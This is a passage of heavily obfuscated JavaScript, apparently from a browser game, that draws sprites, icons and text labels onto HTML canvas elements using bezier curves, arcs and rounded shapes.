				Δ.save();
				Δ.translate(ⵠΔⲆⵠⲆⵠΔ * ᐃ, ᐃ * 77);
				Ⲇᐃᐃ(Δ, ᐃ * -ᐃⵠⵠΔ, -4 * ᐃ, ᐃ * 8, ᐃ * 8, ⵠᐃⲆⲆΔ * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, ΔΔⵠᐃΔ, Ⲇᐃ[Δᐃᐃᐃ], ᐃ * 4);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(11 * ᐃ, ᐃ * 81);
				Δ.bezierCurveTo(ᐃ * ⵠᐃᐃΔⲆ, ᐃ * 105, ᐃ * ⲆΔⵠᐃΔ, ᐃ * 106, ⲆᐃΔⲆⵠ * ᐃ, 91 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[0], 4 * ᐃ)
			} else if (Δⵠⵠⵠ == ⵠᐃ) {
				ⵠᐃᐃ(Δ, ᐃ * 85, 75 * ᐃ, ᐃ * 16);
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ], Ⲇᐃ[0], 4 * ᐃ);
				Δ.scale(-1.7 * ᐃ, 1.7 * ᐃ);
				Δ.translate(ᐃ * -120, ᐃ * ⵠΔⲆⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * ᐃⲆᐃΔⵠ, ᐃ * 95);
				Δ.bezierCurveTo(ᐃ * 56.5, 54 * ᐃ, 56.5 * ᐃ, 54 * ᐃ, 93 * ᐃ, ᐃ * 13);
				Δ.bezierCurveTo(89 * ᐃ, 13 * ᐃ, ᐃ * 89, ᐃ * ⵠΔΔⲆΔΔΔ, 85 * ᐃ, ᐃ * 13);
				Δ.bezierCurveTo(ᐃ * 49.5, 53 * ᐃ, ᐃ * 49.5, ᐃ * 53, ΔΔⲆᐃⲆΔⵠ * ᐃ, ᐃ * 93);
				Δ.bezierCurveTo(ᐃ * 15, ᐃ * 94, 15 * ᐃ, 94 * ᐃ, 19 * ᐃ, 95 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[ᐃⵠⲆ], ᐃ * ⵠⵠΔᐃΔ)
			} else if (ⲆΔⵠⵠ == ⵠᐃ) {
				Δ.translate(-52 * ᐃ, ⲆⲆⲆᐃ);
				Δ.save();
				Δ.translate(84.5 * ᐃ, 36.5 * ᐃ);
				Δ.rotate(-.96);
				Ⲇᐃᐃ(Δ, ᐃ * -5.5, ᐃ * -15.5, ᐃ * 11, ᐃ * 31, 4 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆᐃᐃ], ᐃ * ⵠΔΔᐃΔ);
				Δ.save();
				Δ.translate(ᐃ * 84, ᐃ * 36);
				Δ.rotate(.64);
				Ⲇᐃᐃ(Δ, -ΔᐃΔⲆ * ᐃ, -ᐃⲆᐃᐃΔ * ᐃ, 10 * ᐃ, ᐃ * 32, ΔΔⵠⵠΔ * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ], Ⲇᐃ[1], ΔⲆⲆⲆ * ᐃ);
				Δ.save();
				Δ.translate(83.5 * ᐃ, ᐃ * 36.5);
				Δ.rotate(.68);
				Ⲇᐃᐃ(Δ, ᐃ * -2.5, -6.5 * ᐃ, ᐃ * ⲆΔΔᐃ, ᐃ * ΔⵠⲆΔⲆⲆᐃ, ⵠᐃᐃⲆ * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ])
			} else if (Ⲇⵠⵠⵠ == ⵠᐃ) {
				ⵠᐃᐃ(Δ, 35 * ᐃ, ᐃ * 85, 17 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇᐃⵠⵠ], ᐃ * ᐃᐃⵠⲆᐃ);
				ⵠᐃᐃ(Δ, 85 * ᐃ, ᐃ * 85, ⵠⲆᐃⵠⵠΔⵠ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[ᐃⵠΔ], Δⵠᐃⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
				Δ.moveTo(ᐃ * 53, ᐃ * 86);
				Δ.bezierCurveTo(ᐃ * 59, 83 * ᐃ, 63 * ᐃ, ᐃ * 83, ᐃ * 67, ᐃ * 86);
				ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[0], 4 * ᐃ)
			} else if (ⵠᐃΔⲆ == ⵠᐃ) {
				Δ.scale(1.2, 1.2);
				Δ.translate(-27 * ᐃ, ᐃ * -ⵠⵠⲆⵠΔ);
				Δ.scale(1.2, 1.2);
				Δ.translate(-10 * ᐃ, 0);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(97 * ᐃ, 23 * ᐃ);
				Δ.bezierCurveTo(105 * ᐃ, 24 * ᐃ, 107 * ᐃ, ᐃ * 37, ᐃ * 97, 39 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 85, 40 * ᐃ, ᐃ * 84, 22 * ᐃ, 97 * ᐃ, 23 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⲆⲆᐃ], 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(96 * ᐃ, ᐃ * 24);
				Δ.bezierCurveTo(96 * ᐃ, ᐃ * 30.5, ᐃ * 96, 30.5 * ᐃ, ᐃ * 96, ᐃ * 37);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[0], ᐃ * ΔΔⵠΔ);
				Δ.translate(ⲆⲆⲆᐃ, ᐃ * -ΔⵠⵠΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 88, ᐃ * 37);
				Δ.bezierCurveTo(93 * ᐃ, 33 * ᐃ, ᐃ * 91.5, 34.5 * ᐃ, 95 * ᐃ, 32 * ᐃ);
				Δ.bezierCurveTo(98.5 * ᐃ, 34 * ᐃ, 98.5 * ᐃ, ᐃ * 34, 102 * ᐃ, ᐃ * 36);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆⲆ], Δⵠᐃⵠ * ᐃ)
			} else if (ⵠᐃ == 6) {
				ⵠᐃᐃ(Δ, ᐃ * 13, ᐃ * 79, 5 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[0]);
				ⵠᐃᐃ(Δ, 106 * ᐃ, 79 * ᐃ, 5 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else if (ΔⲆΔᐃᐃ == ⵠᐃ) {
				Δ.translate(ᐃ * ΔᐃΔΔ, ΔⵠⲆⲆ * ᐃ);
				Δ.globalAlpha = .5;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(27 * ᐃ, ᐃ * 14.399993896484375);
				Δ.bezierCurveTo(29 * ᐃ, ᐃ * 4.399993896484375, ᐃ * 44, 16.399993896484375 * ᐃ, ᐃ * 37, 21.399993896484375 * ᐃ);
				Δ.bezierCurveTo(47 * ᐃ, 17.399993896484375 * ᐃ, ᐃ * 45, 36.399993896484375 * ᐃ, ᐃ * 37, 32.399993896484375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 44, 40.399993896484375 * ᐃ, ᐃ * 28, ᐃ * 47.399993896484375, ᐃ * 26, ᐃ * 37.399993896484375);
				Δ.bezierCurveTo(ᐃ * 22, ᐃ * 46.399993896484375, ΔⲆᐃᐃⲆⵠᐃ * ᐃ, 37.399993896484375 * ᐃ, 16 * ᐃ, ᐃ * 30.399993896484375);
				Δ.bezierCurveTo(ᐃ * ⲆᐃⲆΔΔ, 34.399993896484375 * ᐃ, ΔΔΔᐃᐃ * ᐃ, ᐃ * 15.399993896484375, ᐃ * ᐃⲆⲆⵠⵠΔΔ, 19.399993896484375 * ᐃ);
				Δ.bezierCurveTo(10 * ᐃ, 12.399993896484375 * ᐃ, ᐃ * 26, 7.399993896484375 * ᐃ, 26 * ᐃ, 14.399993896484375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
				Δ.globalAlpha = 1;
				Δ.translate(0 * ᐃ, -ΔᐃΔⲆ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
				Δ.moveTo(ᐃ * 27, ᐃ * 14.399993896484375);
				Δ.bezierCurveTo(29 * ᐃ, ᐃ * 4.399993896484375, 44 * ᐃ, 16.399993896484375 * ᐃ, ᐃ * 37, ᐃ * 21.399993896484375);
				Δ.bezierCurveTo(ᐃ * 47, ᐃ * 17.399993896484375, 45 * ᐃ, 36.399993896484375 * ᐃ, ᐃ * 37, 32.399993896484375 * ᐃ);
				Δ.bezierCurveTo(44 * ᐃ, 40.399993896484375 * ᐃ, ᐃ * 28, 47.399993896484375 * ᐃ, ᐃ * 26, 37.399993896484375 * ᐃ);
				Δ.bezierCurveTo(22 * ᐃ, ᐃ * 46.399993896484375, ΔⲆⵠΔⲆ * ᐃ, 37.399993896484375 * ᐃ, ᐃ * 16, ᐃ * 30.399993896484375);
				Δ.bezierCurveTo(ᐃ * 6, ᐃ * 34.399993896484375, ᐃ * ⵠΔᐃⲆᐃᐃⲆ, ᐃ * 15.399993896484375, ᐃ * ᐃᐃᐃᐃⲆ, 19.399993896484375 * ᐃ);
				Δ.bezierCurveTo(10 * ᐃ, 12.399993896484375 * ᐃ, 26 * ᐃ, ᐃ * 7.399993896484375, 26 * ᐃ, ᐃ * 14.399993896484375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], ᐃ * ⲆⲆΔᐃ);
				ⵠᐃᐃ(Δ, 27 * ᐃ, 26.800003051757812 * ᐃ, ⲆΔⲆᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else if (ΔᐃΔⲆⲆ == ⵠᐃ) {
				Δ.translate(-32 * ᐃ, -19 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(123 * ᐃ, 46 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 132, 46 * ᐃ, ᐃ * 135, ᐃ * 39, 134 * ᐃ, ᐃ * 33);
				Δ.bezierCurveTo(145 * ᐃ, 43 * ᐃ, 142 * ᐃ, 65 * ᐃ, ᐃ * 127, ᐃ * 66);
				Δ.bezierCurveTo(118 * ᐃ, ᐃ * 61, 119 * ᐃ, 51 * ᐃ, 123 * ᐃ, 46 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 4 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(49 * ᐃ, 32 * ᐃ);
				Δ.bezierCurveTo(49 * ᐃ, ᐃ * 44, ᐃ * 56, 44 * ᐃ, 61 * ᐃ, 46 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 67, 52 * ᐃ, 65 * ᐃ, 65 * ᐃ, ᐃ * 55, 66 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 37, ᐃ * 60, 42 * ᐃ, ᐃ * 38, 49 * ᐃ, 32 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ], Ⲇᐃ[ᐃΔᐃⲆ], 4 * ᐃ)
			}
			return Ⲇⵠ
		}

		function ⵠΔⵠᐃ(Δ, ᐃⵠⵠⵠ, ⲆⲆⵠ, ΔⵠΔΔ) {
			var ⲆⲆᐃⲆ = 2 * Math.PI / ᐃⵠⵠⵠ;
			Δ.beginPath();
			var ᐃⲆᐃⵠⲆᐃⵠ = [{
				x: ⲆⲆⵠ,
				y: 0
			}];
			var ⵠΔΔᐃᐃΔⵠ = [];
			for (var ⵠᐃ = 1; ᐃⵠⵠⵠ > ⵠᐃ; ⵠᐃ++) {
				ᐃⲆᐃⵠⲆᐃⵠ.push({
					x: ⲆⲆⵠ * Math.sin(ⵠᐃ * ⲆⲆᐃⲆ),
					y: ⲆⲆⵠ * Math.cos(ⵠᐃ * ⲆⲆᐃⲆ)
				});
				var ΔⲆΔᐃⲆ = ᐃⲆᐃⵠⲆᐃⵠ.length;
				ⵠΔΔᐃᐃΔⵠ.push(ΔΔⲆᐃ.ΔⲆⵠΔⲆⵠΔ(ᐃⲆᐃⵠⲆᐃⵠ[ΔⲆΔᐃⲆ - ⲆᐃᐃⲆ], ᐃⲆᐃⵠⲆᐃⵠ[ΔⲆΔᐃⲆ - 1]))
			}
			ⵠΔΔᐃᐃΔⵠ.push(ΔΔⲆᐃ.ΔⲆⵠΔⲆⵠΔ(ᐃⲆᐃⵠⲆᐃⵠ[ᐃⲆᐃⵠⲆᐃⵠ.length - 1], ᐃⲆᐃⵠⲆᐃⵠ[0]));
			var ΔᐃΔ = ⵠΔΔᐃᐃΔⵠ[ⵠΔΔᐃᐃΔⵠ.length - ΔΔΔ];
			Δ.moveTo(ΔᐃΔ.x, ΔᐃΔ.y);
			for (var ⵠᐃ = ⵠⲆⲆ; ⵠᐃ < ᐃⵠⵠⵠ; ⵠᐃ++) Δ.arcTo(ᐃⲆᐃⵠⲆᐃⵠ[ⵠᐃ].x, ᐃⲆᐃⵠⲆᐃⵠ[ⵠᐃ].y, ⵠΔΔᐃᐃΔⵠ[ⵠᐃ].x, ⵠΔΔᐃᐃΔⵠ[ⵠᐃ].y, ΔⵠΔΔ);
			Δ.closePath()
		}

		function ⲆᐃΔⵠᐃⵠᐃ(Δ, Δⵠ, ⲆⵠⲆ, ⲆⲆⵠ, ⲆⲆᐃⲆ) {
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.arc(Δⵠ, ⲆⵠⲆ, ⲆⲆⵠ, ⵠⲆᐃⵠ, ⲆⲆᐃⲆ * (ⵠⵠΔⲆ * Math.PI))
		}

		function ⵠΔⲆᐃⲆⵠⵠᐃⲆ(ᐃ, ᐃⲆᐃⵠ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ⵠⵠᐃ = Math.floor(ᐃ * 28);
			var Δᐃⵠᐃⵠ = Math.floor(ᐃ * 20);
			Δ.font = Δᐃⵠᐃⵠ + ⵠ[484];
			var ΔⲆᐃΔⲆ = 8 * ᐃ;
			var ᐃⵠⵠ = Δ.measureText(ᐃⲆᐃⵠ).width + 2 * ΔⲆᐃΔⲆ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Ⲇᐃᐃ(Δ, ΔΔⵠ, ΔΔⵠⵠ, ᐃⵠⵠ, ⵠⵠᐃ, ᐃ * ⲆⲆᐃΔΔ);
			Δ.globalAlpha = .5;
			ΔⲆ(Δ, ⵠ[481]);
			Δ.globalAlpha = 1;
			Δ.textBaseline = ⵠ[ΔΔⵠΔ], Δ.font = Δᐃⵠᐃⵠ + ⵠ[484];
			Δ.beginPath();
			Δ.fillStyle = ⵠ[253];
			Δ.fillText(ᐃⲆᐃⵠ, ΔⲆᐃΔⲆ, ⵠⵠᐃ / Δᐃⵠⵠ);
			return Ⲇⵠ
		}

		function ⲆΔⲆΔ(ⲆⲆⵠ, ᐃⵠ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var Δⵠⵠᐃ = Math.sqrt(ᐃⵠ.width * ᐃⵠ.width + ᐃⵠ.height * ᐃⵠ.height);
			d2 = Δⵠⵠᐃ / 2;
			Ⲇⵠ.width = Δⵠⵠᐃ;
			Ⲇⵠ.height = Δⵠⵠᐃ;
			Δ.translate(d2, d2);
			Δ.rotate(ⲆⲆⵠ);
			Δ.drawImage(ᐃⵠ, -ᐃⵠ.width / ⲆⲆΔᐃ, -ᐃⵠ.height / 2);
			return Ⲇⵠ
		}
		const ⵠⵠⵠᐃΔⲆⵠ = ⲆΔΔⵠⲆ;
		const ΔᐃⵠⵠⲆ = Ⲇᐃⵠᐃ;

		function ΔΔⵠΔⲆⵠⵠⵠᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 350;
			Ⲇⵠ.height = 350 * ᐃ;
			Δ.translate(0, ᐃ * 15);
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(174 * ᐃ, ᐃ * 172);
			Ⲇᐃᐃ(Δ, ᐃ * -81, ᐃ * -60, ᐃ * 162, ᐃ * 120, ᐃ * 26);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.translate(0, ᐃ * -15);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 174, 172 * ᐃ);
			Ⲇᐃᐃ(Δ, -81 * ᐃ, ᐃ * -60, ᐃ * 162, 120 * ᐃ, ᐃ * 26);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[ⵠⲆⵠⲆ], ᐃ * 7);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 179, ᐃ * 211);
			Δ.bezierCurveTo(183 * ᐃ, 204.5 * ᐃ, 183 * ᐃ, ᐃ * 204.5, 187 * ᐃ, 198 * ᐃ);
			Δ.bezierCurveTo(198.5 * ᐃ, ᐃ * 191.5, 198.5 * ᐃ, ᐃ * 191.5, 210 * ᐃ, 185 * ᐃ);
			Δ.bezierCurveTo(215 * ᐃ, ᐃ * 176.5, ᐃ * 215, ᐃ * 176.5, 220 * ᐃ, 168 * ᐃ);
			Δ.bezierCurveTo(213 * ᐃ, 173.5 * ᐃ, ᐃ * 213, ᐃ * 173.5, 206 * ᐃ, ᐃ * 179);
			Δ.bezierCurveTo(ᐃ * 195, ᐃ * 184, ᐃ * 195, ᐃ * 184, ᐃ * 184, 189 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(167 * ᐃ, 233 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 167, ᐃ * 207, 167 * ᐃ, ᐃ * 207, 167 * ᐃ, ᐃ * 181);
			Δ.bezierCurveTo(ᐃ * 167, ᐃ * 166, 157 * ᐃ, ᐃ * 164, ᐃ * 148, ᐃ * 165);
			Δ.bezierCurveTo(ᐃ * 120, ᐃ * 165, 120 * ᐃ, 165 * ᐃ, ᐃ * 92, 165 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, 186.5 * ᐃ, ᐃ * 92, ᐃ * 186.5, 92 * ᐃ, ᐃ * 208);
			Δ.bezierCurveTo(93 * ᐃ, 222 * ᐃ, 102 * ᐃ, 234 * ᐃ, ᐃ * 119, 233 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[ᐃⲆⵠᐃ], 7 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 152, ᐃ * 179, 6 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 107, ᐃ * 179, 6 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔⵠ]);
			Δ.save();
			Δ.translate(210 * ᐃ, 200 * ᐃ);
			Δ.rotate(.2);
			ⵠΔⵠᐃ(Δ, 6, 32 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[Δⵠⵠⵠ], 7 * ᐃ);
			Δ.save();
			Δ.translate(210 * ᐃ, 200 * ᐃ);
			Δ.rotate(1.0471975511965976);
			ⵠΔⵠᐃ(Δ, ΔᐃⲆᐃ, ⲆⲆⵠΔⵠ * ᐃ, ᐃ * 6);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃΔ], Ⲇᐃ[ⵠⵠⲆⲆⵠ], ᐃ * ΔΔᐃⲆⲆ);
			Δ.save();
			Δ.translate(205 * ᐃ, 193 * ᐃ);
			Δ.rotate(0);
			ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, ⲆΔΔᐃᐃ * ᐃ, ᐃ * 3);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.save();
			Δ.translate(137 * ᐃ, 200 * ᐃ);
			Δ.rotate(-.5235987755982988);
			ⵠΔⵠᐃ(Δ, ⵠΔⵠᐃⵠ, ᐃ * ΔΔⲆⵠᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃΔⲆΔᐃ], 7 * ᐃ);
			Δ.save();
			Δ.translate(131 * ᐃ, ᐃ * 194);
			ⵠΔⵠᐃ(Δ, ⲆᐃⲆΔΔ, 10 * ᐃ, ᐃ * 3);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆΔΔ]);
			Δ.save();
			Δ.translate(ᐃ * 150.5, ᐃ * 120);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -19.5 * ᐃ, ᐃ * -ΔᐃᐃⲆᐃ, 39 * ᐃ, ᐃ * 16, ΔΔⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, Ⲇᐃ[2], ᐃ * ᐃΔⲆΔᐃ);
			return Ⲇⵠ
		}

		function ⲆΔᐃᐃᐃⲆΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 120 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 110;
			var w2 = ᐃⵠⵠ / 2;
			var ΔΔⵠⲆᐃ = ⵠⵠᐃ / Δⵠⵠⵠ;
			var ΔⵠΔΔ = ᐃ * ⵠⲆⲆⲆⲆ;
			var ΔⵠᐃⵠⵠᐃⲆ = ᐃ * 112;
			var ᐃᐃΔᐃⲆΔΔ = 82 * ᐃ;
			var ⵠⲆⲆΔⵠⲆⵠΔⵠ = ΔⵠᐃⵠⵠᐃⲆ / 2;
			var ⲆⵠⵠⲆᐃⵠᐃⲆⵠ = ᐃᐃΔᐃⲆΔΔ / ⵠΔⲆᐃ;
			var ⵠⲆⵠ = ᐃ * ⵠᐃΔΔ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.globalAlpha = Ⲇᐃⵠ;
			Δ.translate(w2, ΔΔⵠⲆᐃ);
			Ⲇᐃᐃ(Δ, -ⵠⲆⲆΔⵠⲆⵠΔⵠ, -ⲆⵠⵠⲆᐃⵠᐃⲆⵠ, ΔⵠᐃⵠⵠᐃⲆ, ᐃᐃΔᐃⲆΔΔ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ⵠⲆⲆᐃᐃⲆᐃᐃᐃ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 176;
			Ⲇⵠ.height = 127 * ᐃ;
			if (ⵠᐃΔΔᐃⲆⵠ == ⵠᐃ) {
				Δ.globalAlpha = .3;
				Δ.save();
				Δ.translate(87 * ᐃ, ᐃ * 64.5);
				Ⲇᐃᐃ(Δ, -56 * ᐃ, ᐃ * -41.5, ᐃ * 112, 83 * ᐃ, 18 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 4 * ᐃ);
				Δ.save();
				Δ.translate(82 * ᐃ, 69.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -51 * ᐃ, -36.5 * ᐃ, ᐃ * 102, ᐃ * 73, 18 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ], Ⲇᐃ[1], ᐃ * ⲆᐃᐃΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(ᐃ * 55, 41 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 38, ᐃ * 41, 37 * ᐃ, 50 * ᐃ, ᐃ * 38, ᐃ * 61);
				Δ.bezierCurveTo(ᐃ * 42, 50 * ᐃ, ᐃ * 46, 46 * ᐃ, ᐃ * 55, ᐃ * 42);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ]);
				Δ.globalAlpha = 1;
				Δ.translate(26 * ᐃ, ⲆⲆⲆΔᐃ * ᐃ);
				ⵠᐃᐃ(Δ, ᐃ * 35, 75 * ᐃ, ᐃ * ⵠⵠⵠᐃΔⲆⵠ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, ᐃ * 85, ᐃ * 75, ⵠᐃⲆΔᐃᐃⲆ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔᐃΔ]);
				ⵠᐃᐃ(Δ, 32 * ᐃ, 67 * ᐃ, ᐃ * ⲆⲆΔⵠ);
				ΔⲆ(Δ, Ⲇᐃ[5]);
				ⵠᐃᐃ(Δ, ᐃ * 82, ᐃ * 67, ⵠⲆᐃᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔΔ])
			} else if (ⵠᐃ == ΔΔⵠⲆⵠ) {
				var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				var Δ = Ⲇⵠ.getContext(ⵠ[289]);
				Ⲇⵠ.width = ᐃ * 332;
				Ⲇⵠ.height = ᐃ * 127;
				Δ.globalAlpha = .5;
				Δ.translate(ΔᐃΔΔ, ᐃ * -36);
				Δ.save();
				Δ.translate(165.25 * ᐃ, ᐃ * 106.84375);
				Ⲇᐃᐃ(Δ, -56.5 * ᐃ, -41.5 * ᐃ, 113 * ᐃ, 83 * ᐃ, ⲆⲆᐃᐃΔⵠⵠ * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
				Δ.globalAlpha = ΔⲆᐃᐃ;
				Δ.translate(0, ᐃ * 20);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(210.75 * ᐃ, 72.84375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 238.75, ᐃ * 74.84375, 270.75 * ᐃ, ᐃ * 85.84375, ᐃ * 269.75, 90.84375 * ᐃ);
				Δ.bezierCurveTo(268.75 * ᐃ, 94.84375 * ᐃ, ᐃ * 221.75, ᐃ * 81.84375, ᐃ * 206.75, 85.84375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 4 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(ᐃ * 208.75, 69.84375 * ᐃ);
				Δ.bezierCurveTo(241.75 * ᐃ, 61.84375 * ᐃ, ᐃ * 265.75, ᐃ * 65.84375, ᐃ * 286.75, ᐃ * 69.84375);
				Δ.bezierCurveTo(ᐃ * 290.75, 75.84375 * ᐃ, 225.75 * ᐃ, 69.84375 * ᐃ, 215.75 * ᐃ, 80.84375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ], Ⲇᐃ[ΔⵠⵠΔ], ⲆⵠΔⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
				Δ.moveTo(209.75 * ᐃ, ᐃ * 69.84375);
				Δ.bezierCurveTo(228.75 * ᐃ, ᐃ * 51.84375, 265.75 * ᐃ, 46.84375 * ᐃ, ᐃ * 294.75, ᐃ * 51.84375);
				Δ.bezierCurveTo(ᐃ * 301.75, ᐃ * 55.84375, ᐃ * 224.75, 60.84375 * ᐃ, ᐃ * 216.75, 80.84375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[ΔⵠᐃⲆ], ᐃ * 4);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
